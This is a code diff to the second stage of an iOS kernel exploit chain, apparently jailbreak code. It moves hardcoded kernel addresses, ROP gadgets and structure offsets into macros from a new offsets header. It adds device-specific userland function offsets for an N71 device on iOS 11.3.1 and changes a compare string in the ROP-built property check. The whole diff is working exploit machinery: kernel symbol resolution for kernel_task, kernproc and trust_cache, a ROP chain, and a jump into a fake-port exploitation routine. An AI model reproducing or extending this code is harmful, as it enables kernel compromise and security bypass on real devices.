@@ -11,9 +11,9 @@
 #include "stage2.h"
 #include "stage1.h"
 
+#include "../shared/jboffsets.h"
 #include "generated/stage2_hash3.h"
 #include "generated/stage2_hash4.h"
-
 
 // TODO: move that whole buidling part into another file and integrate rop_chain_debug into rop_chain
 // get an address of a specific rop variable (basically rop var name to address)
@@ -831,10 +831,10 @@ void stage2(jake_img_t kernel_symbols, offset_struct_t * offsets,char * base_dir
 	ROP_VAR_ARG64("reply_port",5);
 	CALL("mach_msg",0,MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, sizeof(struct get_property_request), sizeof(struct get_property_reply),0, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL,0);
 
-	// setup the compare string ("this boy needs some milk")
+	// setup the compare string ("__developer_mode_enabled")
 	char * cmp_str = malloc(100);
 	memset(cmp_str,0,100);
-	snprintf(cmp_str,100,"this boy needs some milk");
+	snprintf(cmp_str,100,"__developer_mode_enabled");
 	DEFINE_ROP_VAR("cmp_str",100,cmp_str);
 	DEFINE_ROP_VAR("strcmp_retval",8,tmp);
 	// call strcmp and save the ret value
@@ -1356,37 +1356,51 @@ _STRUCT_ARM_THREAD_STATE64
 	} offsets_t;
 	offsets_t * lib_offsets = malloc(sizeof(offsets_t));
 	memset(lib_offsets,0,sizeof(offsets_t));
-	lib_offsets->constant.kernel_image_base = 0xfffffff007004000;
+	lib_offsets->constant.kernel_image_base = OFF_KERNEL_IMAGE_BASE;
 #define sym(name) jake_find_symbol(kernel_symbols,name)
-	lib_offsets->funcs.copyin = sym("_copyin");
-	lib_offsets->funcs.copyout = sym("_copyout");
-	lib_offsets->funcs.current_task = sym("_current_task");
-	lib_offsets->funcs.get_bsdtask_info = sym("_get_bsdtask_info");
-	lib_offsets->funcs.vm_map_wire_external = sym("vm_map_wire_external");
-	lib_offsets->funcs.vfs_context_current = sym("vfs_context_current");
-	lib_offsets->funcs.vnode_lookup = sym("_vnode_lookup");
-	lib_offsets->funcs.osunserializexml = sym("__Z16OSUnserializeXMLPKcPP8OSString");
-	lib_offsets->funcs.smalloc = 0xfffffff006b1acb0; // isn't used anymore
-	lib_offsets->funcs.ipc_port_alloc_special = 0xfffffff0070b9328;
-	lib_offsets->funcs.ipc_kobject_set = 0xfffffff0070cf2c8;
-	lib_offsets->funcs.ipc_port_make_send = 0xfffffff0070b8aa4;
-	lib_offsets->gadgets.add_x0_x0_ret = sym("_csblob_get_cdhash");
-	lib_offsets->data.realhost = find_realhost(kernel_symbols);
-	lib_offsets->data.zone_map = find_zonemap(kernel_symbols);
-	lib_offsets->data.kernel_task = sym("_kernel_task");
-	lib_offsets->data.kern_proc = sym("_kernproc");
-	lib_offsets->data.rootvnode = sym("_rootvnode");
-	lib_offsets->data.osboolean_true = 0xfffffff00764c468; // isn't used anymore
-	lib_offsets->data.trust_cache = 0xfffffff0076b8ee8; // isn't used by stage 3
+	lib_offsets->funcs.copyin = OFF_COPYIN;
+	lib_offsets->funcs.copyout = OFF_COPYOUT;
+	lib_offsets->funcs.current_task = OFF_CURRENT_TASK;
+	lib_offsets->funcs.get_bsdtask_info = OFF_GET_BSDTASK_INFO;
+	lib_offsets->funcs.vm_map_wire_external = OFF_VM_MAP_WIRE_EXTERNAL;
+	lib_offsets->funcs.vfs_context_current = OFF_VFS_CONTEXT_CURRENT;
+	lib_offsets->funcs.vnode_lookup = OFF_VNODE_LOOKUP;
+	lib_offsets->funcs.osunserializexml = OFF_OSUNSERIALIZEXML;
+	lib_offsets->funcs.smalloc = OFF_SMALLOC; // isn't used anymore
+	lib_offsets->funcs.ipc_port_alloc_special = OFF_IPC_PORT_ALLOC_SPECIAL;
+	lib_offsets->funcs.ipc_kobject_set = OFF_IPC_KOBJECT_SET;
+	lib_offsets->funcs.ipc_port_make_send = OFF_IPC_PORT_MAKE_SEND;
+	lib_offsets->gadgets.add_x0_x0_ret = OFF_ADD_X0_X0_RET;
+	lib_offsets->data.realhost = OFF_REALHOST;
+	lib_offsets->data.zone_map = OFF_ZONE_MAP;
+	lib_offsets->data.kernel_task = OFF_KERNEL_TASK;
+	lib_offsets->data.kern_proc = OFF_KERN_PROC;
+	lib_offsets->data.rootvnode = OFF_ROOTVNODE;
+	lib_offsets->data.osboolean_true = OFF_OSBOOLEAN_TRUE; // isn't used anymore
+	lib_offsets->data.trust_cache = OFF_TRUST_CACHE; // isn't used by stage 3
 	// maybe wrong (we will not include them in the symbol finder for now, if that fails we still have the killswitch and could add version differences later)
-	lib_offsets->struct_offsets.is_task_offset = 0x28; 
-	lib_offsets->struct_offsets.task_itk_self = 0xd8;
-	lib_offsets->struct_offsets.itk_registered = 0x2f0;
-	lib_offsets->struct_offsets.ipr_size = 0x8;
-	lib_offsets->struct_offsets.sizeof_task = 0x5c8;
-	lib_offsets->struct_offsets.task_all_image_info_addr = 0x3a8;
-	lib_offsets->struct_offsets.task_all_image_info_size = 0x3b0;
+	lib_offsets->struct_offsets.is_task_offset = OFF_IS_TASK; 
+	lib_offsets->struct_offsets.task_itk_self = OFF_TASK_ITK_SELF;
+	lib_offsets->struct_offsets.itk_registered = OFF_ITK_REGISTERED;
+	lib_offsets->struct_offsets.ipr_size = OFF_IPR_SIZE;
+	lib_offsets->struct_offsets.sizeof_task = OFF_SIZEOF_TASK;
+	lib_offsets->struct_offsets.task_all_image_info_addr = OFF_TASK_ALL_IMAGE_INFO_ADDR;
+	lib_offsets->struct_offsets.task_all_image_info_size = OFF_TASK_ALL_IMAGE_INFO_SIZE;
 	// iosurface stuff isn't set and also isn't used
+	#if N71_11_3_1
+	lib_offsets->userland_funcs.write = OFF_WRITE;
+	lib_offsets->userland_funcs.IOConnectTrap6 = OFF_IOCONNECTTRAP6;
+	lib_offsets->userland_funcs.mach_ports_lookup = OFF_MACH_PORTS_LOOKUP;
+	lib_offsets->userland_funcs.mach_task_self = OFF_MACH_TASK_SELF;
+	lib_offsets->userland_funcs.mach_vm_remap = OFF_MACH_VM_REMAP;
+	lib_offsets->userland_funcs.mach_port_destroy = OFF_MACH_PORT_DESTROY;
+	lib_offsets->userland_funcs.mach_port_deallocate = OFF_MACH_PORT_DEALLOCATE;
+	lib_offsets->userland_funcs.mach_port_allocate = OFF_MACH_PORT_ALLOCATE;
+	lib_offsets->userland_funcs.mach_port_insert_right = OFF_MACH_PORT_INSERT_RIGHT;
+	lib_offsets->userland_funcs.mach_ports_register = OFF_MACH_PORTS_REGISTER;
+	lib_offsets->userland_funcs.mach_msg = OFF_MACH_MSG;
+	lib_offsets->userland_funcs.posix_spawn = OFF_POSIX_SPAWN;
+	#else
 	lib_offsets->userland_funcs.write = (void*)(get_addr_from_name(offsets,"write") - 0x180000000 + offsets->new_cache_addr);
 	lib_offsets->userland_funcs.IOConnectTrap6 = (void*)(get_addr_from_name(offsets,"IOConnectTrap6") - 0x180000000 + offsets->new_cache_addr);
 	lib_offsets->userland_funcs.mach_ports_lookup = (void*)(get_addr_from_name(offsets,"mach_ports_lookup") - 0x180000000 + offsets->new_cache_addr);
@@ -1399,6 +1413,7 @@ _STRUCT_ARM_THREAD_STATE64
 	lib_offsets->userland_funcs.mach_ports_register = (void*)(get_addr_from_name(offsets,"mach_ports_register") - 0x180000000 + offsets->new_cache_addr);
 	lib_offsets->userland_funcs.mach_msg = (void*)(get_addr_from_name(offsets,"mach_msg") - 0x180000000 + offsets->new_cache_addr);
 	lib_offsets->userland_funcs.posix_spawn = (void*)(get_addr_from_name(offsets,"posix_spawn") - 0x180000000 + offsets->new_cache_addr);
+	#endif
 	DEFINE_ROP_VAR("lib_offsets",sizeof(offsets_t),lib_offsets);
 	// jump void where_it_all_starts(kport_t * fakeport,void * fake_client,uint64_t ip_kobject_client_port_addr,uint64_t our_task_addr,uint64_t kslide,uint64_t the_one,offsets_t * offsets)
 	ROP_VAR_ARG_HOW_MANY(7);
